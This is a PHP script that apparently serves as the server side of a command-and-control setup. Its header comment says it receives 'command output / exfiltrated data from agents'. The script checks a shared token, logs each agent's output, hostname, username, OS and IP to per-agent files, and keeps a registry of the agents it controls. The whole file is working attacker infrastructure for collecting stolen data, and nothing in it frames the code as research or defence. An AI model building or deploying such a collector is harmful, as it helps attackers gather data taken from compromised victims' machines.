<?php
/**
 * POST /postdata.php
 * Receives command output / exfiltrated data from agents.
 * Expects JSON body with: agent_id, task_id, output, timestamp
 * Logs everything to per-agent log files + a master log.
 */

header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");

// --- Auth: Simple shared secret check ---
$AUTH_TOKEN = "CHANGE_ME_TO_A_STRONG_SECRET";

$headers = getallheaders();
$token = isset($headers['X-Auth-Token']) ? $headers['X-Auth-Token'] : '';

if ($token !== $AUTH_TOKEN) {
    http_response_code(403);
    echo json_encode(["status" => "error", "message" => "Unauthorized"]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["status" => "error", "message" => "Only POST allowed"]);
    exit;
}

$rawData = file_get_contents("php://input");
$data = json_decode($rawData, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(["status" => "error", "message" => "Invalid JSON data."]);
    exit;
}

$agent_id = isset($data['agent_id']) ? preg_replace('/[^a-zA-Z0-9_\-]/', '', $data['agent_id']) : 'unknown';
$task_id = $data['task_id'] ?? 'none';
$output = $data['output'] ?? '';
$timestamp = $data['timestamp'] ?? date("Y-m-d H:i:s");
$hostname = $data['hostname'] ?? 'unknown';
$username = $data['username'] ?? 'unknown';
$os_info = $data['os'] ?? 'unknown';

// Create logs directory
$log_dir = __DIR__ . "/logs/";
if (!is_dir($log_dir)) {
    mkdir($log_dir, 0700, true);
}

// Log entry structure
$log_entry = [
    "agent_id" => $agent_id,
    "task_id" => $task_id,
    "hostname" => $hostname,
    "username" => $username,
    "os" => $os_info,
    "output" => $output,
    "timestamp" => $timestamp,
    "received" => date("Y-m-d H:i:s")
];

$log_line = json_encode($log_entry) . PHP_EOL;

// Append to master log
file_put_contents($log_dir . "master_log.txt", $log_line, FILE_APPEND | LOCK_EX);

// Append to per-agent log
file_put_contents($log_dir . "agent_" . $agent_id . ".txt", $log_line, FILE_APPEND | LOCK_EX);

// Register / update agent info
$agents_file = __DIR__ . "/agents.json";
$agents = [];
if (file_exists($agents_file)) {
    $agents = json_decode(file_get_contents($agents_file), true) ?? [];
}

$agents[$agent_id] = [
    "hostname" => $hostname,
    "username" => $username,
    "os" => $os_info,
    "last_seen" => date("Y-m-d H:i:s"),
    "ip" => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
];

file_put_contents($agents_file, json_encode($agents, JSON_PRETTY_PRINT), LOCK_EX);

echo json_encode(["status" => "success", "message" => "Data received."]);
?>